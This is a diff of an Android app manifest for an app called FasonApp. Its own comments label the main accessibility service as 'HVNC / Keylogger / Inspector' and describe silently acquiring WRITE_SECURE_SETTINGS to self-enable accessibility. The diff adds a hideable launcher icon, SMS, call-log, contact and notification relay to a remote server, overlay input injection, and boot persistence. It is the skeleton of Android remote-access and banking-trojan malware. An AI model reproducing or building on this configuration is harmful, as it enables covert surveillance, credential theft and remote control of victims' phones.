@@ -2,97 +2,124 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
-
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.CAMERA" />
-
-    <uses-feature android:name="android.hardware.camera.any" android:required="false" />
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <!-- ─── Core network ──────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-feature android:name="android.hardware.telephony" android:required="false" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission
-        android:name="android.permission.QUERY_ALL_PACKAGES"
-        tools:ignore="QueryAllPackagesPermission" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- ─── Foreground service types (one declaration each) ──────── -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- ─── Overlay (Springe) ─────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- ─── Camera ───────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-feature android:name="android.hardware.camera"         android:required="false" />
+    <uses-feature android:name="android.hardware.camera.any"     android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+
+    <!-- ─── Storage (API-split: media on 33+, legacy below) ──────── -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
+
+    <!-- ─── Notifications ───────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- ─── Telephony ────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+
+    <!-- ─── WiFi ─────────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- ─── Location ─────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- ─── Audio ────────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- ─── Contacts ─────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- ─── Package visibility ───────────────────────────────────── -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- ─── System ───────────────────────────────────────────────── -->
+    <!-- Silently acquired via pm grant on userdebug/root — enables direct
+         Settings.Secure write for a11y self-enable + notification listener -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <application
         android:name=".core.FasonApp"
         android:allowBackup="false"
+        android:allowClearUserData="false"
+        android:autoRevokePermissions="disallowed"
         android:hardwareAccelerated="true"
-        android:largeHeap="true"
-        android:usesCleartextTraffic="false"
-        android:networkSecurityConfig="@xml/network_security_config"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
-        android:supportsRtl="true"
-        android:autoRevokePermissions="disallowed"
-        android:allowClearUserData="false"
+        android:largeHeap="true"
+        android:networkSecurityConfig="@xml/network_security_config"
         android:requestLegacyExternalStorage="true"
-        android:theme="@style/AppTheme">
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="false">
 
+        <!-- ── Main activity ──────────────────────────────────────── -->
         <activity
             android:name=".ui.MainActivity"
-            android:launchMode="singleTask"
-            android:exported="true"
+            android:configChanges="orientation|screenSize|keyboardHidden"
             android:excludeFromRecents="true"
-            android:taskAffinity=""
-            android:configChanges="orientation|screenSize|keyboardHidden">
-        </activity>
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:taskAffinity="" />
 
+        <!-- ── Screen-capture proxy (transparent, no recents) ──────── -->
         <activity
             android:name=".ui.ScreenCaptureProxyActivity"
-            android:theme="@style/TransparentTheme"
-            android:launchMode="singleTask"
-            android:exported="false"
-            android:excludeFromRecents="true"
-            android:taskAffinity=".ui.ScreenCaptureProxyActivity"
             android:autoRemoveFromRecents="true"
-            android:enableOnBackInvokedCallback="false">
-        </activity>
+            android:enableOnBackInvokedCallback="false"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:taskAffinity=".ui.ScreenCaptureProxyActivity"
+            android:theme="@style/TransparentTheme" />
 
+        <!-- ── Launcher alias (toggled to hide/show icon) ─────────── -->
         <activity-alias
             android:name=".ui.MainActivityAlias"
-            android:targetActivity=".ui.MainActivity"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:targetActivity=".ui.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
+        <!-- ── Core background service ────────────────────────────── -->
         <service
             android:name=".service.MainService"
             android:enabled="true"
@@ -103,11 +130,12 @@
                 android:value="Persistent socket connection for remote device management" />
         </service>
 
+        <!-- ── Primary accessibility service (HVNC / Keylogger / Inspector) ── -->
         <service
             android:name=".core.FasonAccessibilityService"
+            android:exported="false"
             android:label="@string/accessibility_service_label"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false">
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -116,6 +144,47 @@
                 android:resource="@xml/fason_accessibility_config" />
         </service>
 
+        <!-- ── Notification listener ──────────────────────────────── -->
+        <service
+            android:name=".features.notification.NotificationRelayService"
+            android:exported="true"
+            android:foregroundServiceType="specialUse"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Relay device notifications to remote management server" />
+        </service>
+
+        <!-- ── Springe overlay service ────────────────────────────── -->
+        <service
+            android:name=".features.springe.SpringeService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="springe_overlay" />
+        </service>
+
+        <!-- ── Springe accessibility (input injection for overlay) ── -->
+        <service
+            android:name=".features.springe.SpringeAccessibilityService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/overlay_accessibility_config" />
+        </service>
+
+        <!-- ── Receivers ──────────────────────────────────────────── -->
         <receiver
             android:name=".receiver.SmsReceiver"
             android:enabled="true"
@@ -129,11 +198,22 @@
         <receiver
             android:name=".receiver.BootReceiver"
             android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiver.ScreenStateReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
 
@@ -147,41 +227,5 @@
             </intent-filter>
         </receiver>
 
-        <service
-            android:name=".features.notification.NotificationRelayService"
-            android:label="@string/app_name"
-            android:foregroundServiceType="specialUse"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-            <property
-                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="Relay device notifications to remote management server" />
-        </service>
-
-        <service
-            android:name=".features.overlay.OverlayService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="specialUse">
-            <property
-                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="overlay_host" />
-        </service>
-
-        <service
-            android:name=".features.overlay.OverlayAccessibilityService"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/overlay_accessibility_config" />
-        </service>
     </application>
 </manifest>
